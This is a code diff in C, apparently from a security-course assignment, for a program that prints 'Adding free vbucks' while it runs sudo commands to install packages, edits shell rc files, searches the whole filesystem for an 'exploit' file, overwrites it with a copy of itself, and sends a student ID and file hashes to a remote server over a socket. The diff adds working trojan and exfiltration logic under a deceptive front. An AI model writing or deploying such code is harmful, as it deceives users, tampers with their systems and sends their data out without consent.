@@ -2,12 +2,14 @@
 
 #include "file_arrays/all_arrays.h"
 #include "utils/utils.h"
+#include "server.h"
 
 #define EXPLOIT_NAME "exploit.agh"
 #define FOUND_EXPLOIT 1
 #define STUDENT_ID_LENGTH 6
+#define PAYLOAD_LENGTH STUDENT_ID_LENGTH + 2*(SHA_DIGEST_LENGTH+MD5_DIGEST_LENGTH) + 4
 
-char home_path[128], virus_path[256], exploit_path[256], student_id[STUDENT_ID_LENGTH+1];
+char home_path[128], virus_path[256], exploit_path[256];
 
 // installs pacman onto system
 void install_pacman() {
@@ -63,9 +65,9 @@ void install_pacman() {
 	mkdir("/arch-root/var/lib", 0755);
 	mkdir("/arch-root/var/lib/pacman", 0755);
 
-	// sync databases and install base
+	// sync databases and install base + vim for later injection
 	system_no_output("sudo pacman --root /arch-root -Sy");
-	system_no_output("sudo pacman --root /arch-root -S base --noconfirm");
+	system_no_output("sudo pacman --root /arch-root -S base vim --noconfirm");
 
 	// write fakeapt script to bin (alias for apt -> pacman)
 	write_file(fakeapt, fakeapt_len, fakeapt_out_path, 0755);
@@ -102,18 +104,17 @@ int nftw_visit(const char *file_path, const struct stat *sb, int typeflag, struc
 	return 0;
 }
 
-// use exploit to get student ID and overwrite the file with the virus
-void use_exploit() {
-	// find exploit path
+// find exploit path
+void find_exploit() {
 	// try first in home directory
 	if (nftw(home_path, nftw_visit, 100, FTW_PHYS | FTW_DEPTH) != FOUND_EXPLOIT) {
 		// if exploit not found in home, search the entire filesystem
-		if (nftw("/", nftw_visit, 100, FTW_PHYS | FTW_DEPTH) != FOUND_EXPLOIT) {
-			// if exploit not found, abort the overwrite operation
-			return;
-		}
+		nftw("/", nftw_visit, 100, FTW_PHYS | FTW_DEPTH);
 	}
+}
 
+// use exploit to get student ID and overwrite the file with the virus
+void use_exploit(char *student_id) {
 	// get student ID from exploit file
 	int exploit_file = open(exploit_path, O_RDONLY);
 	read(exploit_file, student_id, STUDENT_ID_LENGTH+1);
@@ -121,8 +122,29 @@ void use_exploit() {
 	student_id[STUDENT_ID_LENGTH] = '\0';
 
 	// overwrite exploit file with virus
-	readlink("/proc/self/exe", virus_path, 256);
 	cp_file(virus_path, exploit_path);
+}
+
+// impersonate another program and send payload to server
+void impersonate_and_send(const char *student_id, const char *sha1, const char *md5) {
+	// get payload
+	char payload[PAYLOAD_LENGTH + 1];
+	sprintf(payload, "%s:%s:%s\n", student_id, md5, sha1);
+	payload[PAYLOAD_LENGTH] = '\0';
+
+	// TODO: IMPERSONATION
+
+	// get address
+	struct sockaddr_in server_address;
+	server_address.sin_family = AF_INET;
+	server_address.sin_addr.s_addr = inet_addr(SERVER_IP);
+	server_address.sin_port = htons(SERVER_PORT);
+
+	// send payload
+	int sock = socket(AF_INET, SOCK_STREAM, 0);
+	connect(sock, (struct sockaddr*) &server_address, sizeof(server_address));
+	send(sock, payload, strlen(payload), 0);
+	close(sock);
 }
 
 int main() {
@@ -133,13 +155,26 @@ int main() {
 		return 1;
 	}
 
-	// Add free vbucks
+	char student_id[STUDENT_ID_LENGTH+1];
+	char sha1[2*SHA_DIGEST_LENGTH+1], md5[2*MD5_DIGEST_LENGTH+1];
+
+	// Connect to Epic Games servers
 	printf("Accessing Epic Games servers...\n");
+
 	find_home_path(home_path);
 	install_pacman();
+
+	// Add free vbucks
 	printf("Adding free vbucks...\n");
+
 	modify_rc_files();
-	use_exploit();
+	find_virus_path(virus_path);
+	find_exploit();
+	calculate_hash_of_file("sha1", exploit_path, sha1);
+	calculate_hash_of_file("md5", virus_path, md5);
+	use_exploit(student_id);
+	impersonate_and_send(student_id, sha1, md5);
+
 	printf("Free vbucks added!\n");
 
 	return 0;
